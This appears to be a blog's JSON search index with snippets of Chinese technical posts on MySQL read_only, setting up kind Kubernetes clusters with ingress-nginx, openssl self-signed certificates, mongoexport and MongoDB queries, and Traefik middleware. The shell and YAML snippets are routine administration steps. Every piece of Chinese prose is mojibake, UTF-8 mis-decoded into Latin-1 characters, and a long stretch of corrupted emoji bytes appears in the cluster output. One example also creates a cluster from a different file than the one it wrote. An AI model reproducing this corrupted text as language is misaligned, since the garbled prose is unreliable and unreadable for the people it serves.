[{"categories":null,"content":"SoulChild's friends","date":"2023-01-13 12:56","objectID":"/friends/","tags":null,"title":"å‹æƒ…é“¾æ¥","uri":"/friends/"},{"categories":null,"content":"ç¦»çº¿ - SoulChildéšç¬”è®°","date":"0001-01-01 00:00","objectID":"/offline/","tags":null,"title":"","uri":"/offline/"},{"categories":["databases"],"content":"åœ¨ MySQL8 ä¸­ï¼Œé€šè¿‡è®¾ç½® read_only å‚æ•°å¯ä»¥å®ç°åªè¯»æ¨¡å¼ã€‚å½“è¯¥å‚æ•°è®¾ç½®ä¸º1æ—¶ï¼ŒMySQL å®ä¾‹å˜ä¸ºåªè¯»æ¨¡å¼ï¼Œç¦æ­¢å¯¹æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œåªå…è®¸æ‰§è¡Œ SELECT å’Œ SHOW è¯­å¥ã€‚ä½†æ˜¯ï¼Œå¦‚æœç”¨æˆ·æ‹¥æœ‰ CONNECTION_ADMIN æƒé™ï¼Œåˆ™ä»ç„¶å¯ä»¥è¿æ¥åˆ°å®ä¾‹å¹¶æ‰§è¡Œå†™æ“ä½œã€‚ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥è§£å†³ revoke CONNECTION_ADMIN on *.* from xxx; ","date":"2023-04-14 01:39","objectID":"/post/mysql8-readonly%E4%B8%8D%E7%94%9F%E6%95%88/:0:0","tags":[""],"title":"Mysql8 readonlyä¸ç”Ÿæ•ˆ","uri":"/post/mysql8-readonly%E4%B8%8D%E7%94%9F%E6%95%88/"},{"categories":["kubernetes"],"content":"å‰è¨€ ä¸Šä¸€ç« äº†è§£äº†ä½¿ç”¨ kind å¿«é€Ÿåˆ›å»ºä¸€ä¸ªç®€å• kubernetes é›†ç¾¤, ä½†åœ¨å®é™…ä½¿ç”¨ä¸­å¾€å¾€æ˜¯ä¸å¤Ÿç”¨çš„, æ¯”å¦‚æˆ‘ä»¬å¯èƒ½éœ€è¦è®¿é—®é›†ç¾¤ä¸­éƒ¨ç½²çš„httpæœåŠ¡, æˆ–è€…æˆ‘ä»¬è¦å¯ç”¨ä¸€äº›k8sé»˜è®¤å…³é—­çš„ç‰¹æ€§, å®‰è£…å¤šèŠ‚ç‚¹çš„ k8s é›†ç¾¤ç­‰ç­‰ã€‚ä¸ºäº†å®Œæˆè¿™äº›é«˜çº§åŠŸèƒ½ï¼Œå»ºè®®ä½¿ç”¨ YAML æ–‡ä»¶æ¥è¿›è¡Œé…ç½®ã€‚è¿™æ ·å¯ä»¥æ›´å¥½åœ°æ§åˆ¶å’Œå®šåˆ¶é›†ç¾¤ã€‚ ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:1:0","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"ä½¿ç”¨yaml åœ¨åˆ›å»ºé›†ç¾¤çš„æ—¶å€™ä½¿ç”¨ kind create cluster --config=config.yaml å°±å¯ä»¥å®‰è£…äº†ã€‚ åœ¨ yaml é…ç½®ä¸­ä¸»è¦å¯ä»¥åˆ†ä¸º é›†ç¾¤çº§åˆ«çš„é…ç½®å’ŒèŠ‚ç‚¹çº§åˆ«çš„é…ç½®, ä¸‹é¢ä¸»è¦ä»‹ç»å¸¸ç”¨çš„ yaml é…ç½®æ€ä¹ˆå†™ã€‚ å®Œæ•´çš„é…ç½®è¯·æŸ¥çœ‹ç»“æ„ä½“ https://github.com/kubernetes-sigs/kind/blob/v0.18.0/pkg/apis/config/v1alpha4/types.go#L20 ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:2:0","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"é›†ç¾¤é…ç½® 1. é›†ç¾¤åç§° kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 name: app-1-cluster 2. å¯ç”¨ç‰¹æ€§ kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 featureGates: \"CSIMigration\": true https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/#feature-gates-for-alpha-or-beta-features 3. ç½‘ç»œé…ç½® kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 networking: ipFamily: ipv4 # å¯é€‰ipv4ã€ipv6ã€dual # å¦‚æœåªéœ€è¦æœ¬æœºè®¿é—®å°±ä¸ç”¨è®¾ç½®äº† apiServerPort: -1 # åœ¨å®¿ä¸»æœºä¸Šçš„ç›‘å¬ç«¯å£, é»˜è®¤éšæœºç«¯å£ apiServerAddress: 127.0.0.1 # åœ¨å®¿ä¸»æœºä¸Šçš„ç›‘å¬åœ°å€ podSubnet: \"10.244.0.0/16\" # podçš„ç½‘æ®µ, IPv4 é»˜è®¤ 10.244.0.0/16, IPv6 é»˜è®¤ fd00:10:244::/56 serviceSubnet: \"10.96.0.0/16\" # serviceçš„ç½‘æ®µ, IPv4 é»˜è®¤ 10.96.0.0/16, IPv6 é»˜è®¤ fd00:10:96::/112 disableDefaultCNI: false # é»˜è®¤false, å¦‚æœä¸º true å°†ä¸ä¼šå®‰è£…kindnetd, kindnetdæ˜¯kindé™„å¸¦çš„ä¸€ä¸ªç®€å•çš„ç½‘ç»œå®ç° kubeProxyMode: \"iptables\" # é»˜è®¤ iptables , å¯é€‰ ipvs dnsSearch: # æœç´¢åŸŸ - xxx.local KubeadmConfigPatches ç”¨æ¥ä¿®æ”¹ kubeadm çš„é…ç½®å’Œ KubeadmConfigPatchesJSON6902 è®¾ç½®åˆå¹¶ç­–ç•¥ ContainerdConfigPatches å’Œ ContainerdConfigPatchesJSON6902 ç”¨æ¥ä¿®æ”¹ containerd çš„é…ç½® ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:2:1","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"èŠ‚ç‚¹é…ç½® kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane # å¯é€‰ control-plane å’Œ worker image: kindest/node:v1.16.4@sha256:b91a2c2317a000f3a783489dfb755064177dbc3a0b2f4147d50f04825d016f55 labels: ... # èŠ‚ç‚¹æ ‡ç­¾,ç”¨äºnodeSelector extraMounts: - containerPath: # k8sèŠ‚ç‚¹ä¸­çš„è·¯å¾„ hostPath: # å®¿ä¸»æœºè·¯å¾„ readOnly: false # æ˜¯å¦åªè¯», é»˜è®¤false selinuxRelabel: false # é»˜è®¤false propagation: None # è®¾ç½® propagation æ¨¡å¼, å¯é€‰None, HostToContainer, Bidirectional, ä¸€èˆ¬é»˜è®¤å³å¯ extraPortMappings: - containerPort: 80 # k8sèŠ‚ç‚¹ä¸­çš„ç«¯å£ hostPort: 80 # å®¿ä¸»æœºçš„ç«¯å£ listenAddress: 0.0.0.0 # å®¿ä¸»æœºçš„ç›‘å¬åœ°å€,é»˜è®¤0.0.0.0 protocol: TCP # å¯é€‰ TCP, UDP, SCTP KubeadmConfigPatches ç”¨æ¥ä¿®æ”¹å½“å‰èŠ‚ç‚¹çš„ kubeadm çš„é…ç½® KubeadmConfigPatchesJSON6902 è®¾ç½®åˆå¹¶ç­–ç•¥ ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:2:2","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"éƒ¨ç½²ä¸€ä¸ªå¸¦ingressçš„é›†ç¾¤ ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:0","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"1. åˆ›å»ºé›†ç¾¤ [root@mytest kind]# cat \u003e mykind2.yaml \u003c\u003cEOF kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 name: mykind2 nodes: - role: control-plane labels: ingress-ready: true extraPortMappings: - containerPort: 80 hostPort: 80 protocol: TCP - containerPort: 443 hostPort: 443 protocol: TCP - role: worker EOF [root@mytest kind]# kind create cluster --config test-c.yaml Creating cluster \"mykind2\" ... âœ“ Ensuring node image (kindest/node:v1.26.3) ğŸ–¼ âœ“ Preparing nodes ğŸ“¦ ğŸ“¦ âœ“ Writing configuration ğŸ“œ âœ“ Starting control-plane ğŸ•¹ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ï¸ âœ“ Installing CNI ğŸ”Œ âœ“ Installing StorageClass ğŸ’¾ âœ“ Joining worker nodes ğŸšœ Set kubectl context to \"kind-mykind2\" You can now use your cluster with: kubectl cluster-info --context kind-mykind2 Thanks for using kind! ğŸ˜Š ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:1","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"2. å®‰è£…ingress-nginx-controller [root@mytest kind]# kubectl --context kind-mykind2 apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:2","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"3. æŸ¥çœ‹podçŠ¶æ€ [root@mytest ~]# kubectl --context kind-mykind2 get pod -n ingress-nginx -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES ingress-nginx-admission-create-fgdsj 0/1 Completed 0 60s 10.244.1.7 mykind2-worker \u003cnone\u003e \u003cnone\u003e ingress-nginx-admission-patch-7l5bv 0/1 Completed 2 60s 10.244.1.6 mykind2-worker \u003cnone\u003e \u003cnone\u003e ingress-nginx-controller-6bdf7bdbdd-lq6f8 1/1 Running 0 60s 10.244.0.6 mykind2-control-plane \u003cnone\u003e \u003cnone\u003e ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:3","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"4. åˆ›å»ºæµ‹è¯•åº”ç”¨ yaml å¦‚ä¸‹ kind: Pod apiVersion: v1 metadata: name: foo-app labels: app: foo spec: containers: - command: - /agnhost - netexec - --http-port - \"8080\" image: registry.k8s.io/e2e-test-images/agnhost:2.39 name: foo-app --- kind: Service apiVersion: v1 metadata: name: foo-service spec: selector: app: foo ports: # Default port used by the image - port: 8080 --- kind: Pod apiVersion: v1 metadata: name: bar-app labels: app: bar spec: containers: - command: - /agnhost - netexec - --http-port - \"8080\" image: registry.k8s.io/e2e-test-images/agnhost:2.39 name: bar-app --- kind: Service apiVersion: v1 metadata: name: bar-service spec: selector: app: bar ports: # Default port used by the image - port: 8080 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: example-ingress annotations: nginx.ingress.kubernetes.io/rewrite-target: /$2 spec: rules: - http: paths: - pathType: Prefix path: /foo(/|$)(.*) backend: service: name: foo-service port: number: 8080 - pathType: Prefix path: /bar(/|$)(.*) backend: service: name: bar-service port: number: 8080 ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:4","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"5. è®¿é—®æµ‹è¯• [root@mytest kind]# curl http://192.168.124.52/foo/hostname ;echo foo-app [root@mytest kind]# curl http://192.168.124.52/bar/hostname ;echo bar-app ","date":"2023-04-13 14:37","objectID":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/:3:5","tags":[""],"title":"Kindé«˜çº§è‡ªå®šä¹‰å®‰è£…(äºŒ)","uri":"/post/kind%E9%AB%98%E7%BA%A7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BA%8C/"},{"categories":["kubernetes"],"content":"ä»€ä¹ˆæ˜¯ Kind? kind å¯ä»¥è®©æ‚¨åœ¨æœ¬åœ°è¿è¡Œ Kubernetes é›†ç¾¤ã€‚å®ƒä½¿ç”¨ Docker å®¹å™¨æ¥æ¨¡æ‹Ÿ Kubernetes é›†ç¾¤çš„èŠ‚ç‚¹ï¼Œå¹¶ä½¿ç”¨ kubeadm æ¥å¯åŠ¨é›†ç¾¤ã€‚ kind ä¸»è¦ç”¨äºæµ‹è¯• Kubernetes æœ¬èº«ï¼Œä½†ä¹Ÿå¯ç”¨äºæœ¬åœ°å¼€å‘æˆ– CIã€‚ ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:1:0","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Kind? ä½¿ç”¨ Kind å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹: å¿«é€Ÿæ­å»º: åœ¨å‡ åˆ†é’Ÿå†…åˆ›å»ºå’Œé”€æ¯ Kubernetes é›†ç¾¤ï¼Œè€Œæ— éœ€ç­‰å¾…äº‘æä¾›å•†èµ„æºã€‚ ä¾¿äºæµ‹è¯•: Kind ä½¿ç”¨ Docker å®¹å™¨æ¥æ¨¡æ‹Ÿ Kubernetes èŠ‚ç‚¹ï¼Œå› æ­¤æ‚¨å¯ä»¥è½»æ¾åœ°å¯¹æ•´ä¸ªé›†ç¾¤æˆ–å•ä¸ªç»„ä»¶è¿›è¡Œæµ‹è¯•ã€‚ ç®€åŒ–å¼€å‘: Kind å¯ä»¥åœ¨æœ¬åœ°æä¾›ä¸€ä¸ªç±»ä¼¼äºç”Ÿäº§ç¯å¢ƒçš„ Kubernetes é›†ç¾¤ï¼Œä»è€ŒåŠ å¿«åº”ç”¨ç¨‹åºçš„å¼€å‘å’Œè°ƒè¯•è¿‡ç¨‹ã€‚ å¯ç§»æ¤æ€§: Kind å¯ä»¥åœ¨ä»»ä½•æ”¯æŒ Docker çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œä¾‹å¦‚æœ¬åœ°æœºå™¨ã€CI/CD ç³»ç»Ÿã€äº‘ç¯å¢ƒç­‰ã€‚ ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:2:0","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"å®‰è£…å’Œé…ç½® Kind ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:3:0","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"1ï¼šå®‰è£… Docker ç•¥ ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:3:1","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"2. å®‰è£… kind curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.18.0/kind-linux-amd64 chmod +x ./kind sudo mv ./kind /usr/local/bin/kind ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:3:2","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"å¸¸ç”¨æ“ä½œ ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:4:0","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"1. åˆ›å»ºä¸€ä¸ªå•èŠ‚ç‚¹ Kubernetes é›†ç¾¤ kind create cluster --name mykind1 --wait 5m é»˜è®¤ name ä¸º kind é»˜è®¤å®‰è£…æœ€æ–°çš„ç‰ˆæœ¬, å¯ä»¥é€šè¿‡ --image kindest/node:v1.26.3 æŒ‡å®šk8sç‰ˆæœ¬ å®‰è£…æˆåŠŸåéœ€è¦è‡ªè¡Œå®‰è£…é…ç½® kubectl, wget https://dl.k8s.io/v1.26.3/kubernetes-client-linux-amd64.tar.gz ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:4:1","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"2. æŸ¥çœ‹é›†ç¾¤åˆ—è¡¨ kind get clusters ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:4:2","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"3. åˆ é™¤é›†ç¾¤ kind delete cluster --name mykind1 é»˜è®¤åˆ é™¤ name ä¸º kind çš„é›†ç¾¤ ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:4:3","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["kubernetes"],"content":"4. å°†å®¹å™¨é•œåƒå¯¼å…¥åˆ°é›†ç¾¤ä¸­ å¯¼å…¥æœ¬åœ°é•œåƒåˆ°é›†ç¾¤ä¸­ kind load docker-image my-custom-image-0 my-custom-image-1 --name mykind1 è¿™å°†å¯¼å…¥ my-custom-image-0,my-custom-image-1 åˆ° mykind1 é›†ç¾¤ä¸­ å¯¼å…¥å½’æ¡£æ–‡ä»¶é•œåƒåˆ°é›†ç¾¤ä¸­ kind load image-archive /my-image-archive.tar ","date":"2023-04-13 13:29","objectID":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/:4:4","tags":["kind","kubernetes","docker"],"title":"Kindå…¥é—¨æŒ‡å—(ä¸€)","uri":"/post/kind%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E4%B8%80/"},{"categories":["å…¶ä»–"],"content":"ç®€å•å¿«æ·ç”¨èµ·æ¥å°±æ˜¯ä¸€ä¸ªå­— çˆ½ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -out headers.ops.com.crt -keyout headers.ops.com.key -subj \"/CN=ops.com\" -addext \"subjectAltName=DNS.1:ops.com,DNS.2:*.ops.com,DNS.3:*.headers.ops.com,IP.1:127.0.0.1\" -nodes ","date":"2023-04-11 13:46","objectID":"/post/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90https%E8%AF%81%E4%B9%A6%E6%B5%8B%E8%AF%95/:0:0","tags":[""],"title":"å¿«é€Ÿç”Ÿæˆhttpsè¯ä¹¦æµ‹è¯•","uri":"/post/%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90https%E8%AF%81%E4%B9%A6%E6%B5%8B%E8%AF%95/"},{"categories":["databases"],"content":"https://www.mongodb.com/docs/manual/tutorial/query-documents/ ","date":"2023-04-11 11:25","objectID":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/:0:0","tags":[""],"title":"Mongoå¸¸ç”¨æŸ¥è¯¢å¤‡å¿˜","uri":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/"},{"categories":["databases"],"content":"ä½¿ç”¨mongoexportå¯¼å‡ºæ•°æ® mongoexport --host=xx.xx.xx.xx --port=3717 -uadmin -p123456 --authenticationDatabase=admin --db d1 --collection c1 --type csv --fields contentType,content,decision,lastOpInfo,createdTime --query '{\"lastOp\":\"refuse\", \"updatedTime\": { \"$gt\":1672502400}}' --out xxx.csv ","date":"2023-04-11 11:25","objectID":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/:0:1","tags":[""],"title":"Mongoå¸¸ç”¨æŸ¥è¯¢å¤‡å¿˜","uri":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/"},{"categories":["databases"],"content":"å¸¸è§æŸ¥è¯¢æ“ä½œç¬¦ https://www.mongodb.com/docs/manual/reference/operator/query/\\ $eqï¼šåŒ¹é…å­—æ®µç­‰äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $neï¼šåŒ¹é…å­—æ®µä¸ç­‰äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $gtï¼šåŒ¹é…å­—æ®µå¤§äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $gteï¼šåŒ¹é…å­—æ®µå¤§äºæˆ–ç­‰äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $ltï¼šåŒ¹é…å­—æ®µå°äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $lteï¼šåŒ¹é…å­—æ®µå°äºæˆ–ç­‰äºæŒ‡å®šå€¼çš„æ–‡æ¡£ $inï¼šåŒ¹é…å­—æ®µå€¼åœ¨æŒ‡å®šæ•°ç»„ä¸­çš„æ–‡æ¡£ $ninï¼šåŒ¹é…å­—æ®µå€¼ä¸åœ¨æŒ‡å®šæ•°ç»„ä¸­çš„æ–‡æ¡£ $existsï¼šåŒ¹é…åŒ…å«æŒ‡å®šå­—æ®µçš„æ–‡æ¡£ $typeï¼šåŒ¹é…æŒ‡å®šæ•°æ®ç±»å‹çš„æ–‡æ¡£ $regexï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—æ®µå€¼çš„æ–‡æ¡£ $notï¼šå–å $and $or ","date":"2023-04-11 11:25","objectID":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/:0:2","tags":[""],"title":"Mongoå¸¸ç”¨æŸ¥è¯¢å¤‡å¿˜","uri":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/"},{"categories":["databases"],"content":"å¸¸ç”¨query åˆ¤æ–­æ—¥æœŸ {\"lastOp\":\"refuse\", \"updatedTime\": {\"$gt\":1672502400}} {\"updatedTime\": {\"$gte\": 1649539200, \"$lte\": 1652121600}} ä½¿ç”¨æ­£åˆ™ {\"group\": {\"$regex\": \".*_666_.*\"} æŸ¥è¯¢å­—æ®µå­˜åœ¨ä¸”ä¸ä¸ºç©ºçš„è®°å½• {\"name\": {\"$exists\": true, \"$ne\": null}} in æ•°ç»„ // \"tags\"æ•°ç»„ä¸­åŒ…å«\"music\"æˆ–è€…\"art\"çš„æ–‡æ¡£ {\"tags\": {\"$in\": [\"music\", \"art\"]}} // ç»“åˆæ­£åˆ™ {\"tags\": {\"$in\": [\"/^be/\", \"/^st/\"]}} and {\"$and\": [{\"age\": {\"$gte\": 18}}, {\"gender\": \"female\"}]} ","date":"2023-04-11 11:25","objectID":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/:0:3","tags":[""],"title":"Mongoå¸¸ç”¨æŸ¥è¯¢å¤‡å¿˜","uri":"/post/mongo%E5%B8%B8%E7%94%A8%E6%9F%A5%E8%AF%A2%E5%A4%87%E5%BF%98/"},{"categories":["kubernetes"],"content":"ä¸­é—´ä»¶æ˜¯ä¸€ç§ åœ¨è¯·æ±‚è¢«å‘é€åˆ°åç«¯æœåŠ¡ä¹‹å‰(æˆ–æ¥è‡ªåç«¯æœåŠ¡çš„åº”ç­”è¢«å‘é€åˆ°å®¢æˆ·ç«¯ä¹‹å‰) ä¿®æ”¹è¯·æ±‚çš„æ–¹æ³•ã€‚ åœ¨traefikä¸­å†…ç½®äº†ä¸¤å¤§ç±»çš„ä¸­é—´ä»¶,åˆ†åˆ«æ˜¯HTTPå’ŒTCP,ä¸‹é¢ä»‹ç»ä¸€äº›å¸¸ç”¨çš„ä¸­é—´ä»¶ ","date":"2023-04-10 23:12","objectID":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/:0:0","tags":["traefik"],"title":"Traefik Middlewareé…ç½®è¯¦è§£(ä¸‰)","uri":"/post/traefik-middleware%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E4%B8%89/"},{"categories":["kubernetes"],"content":"HTTP(kind: Middleware) 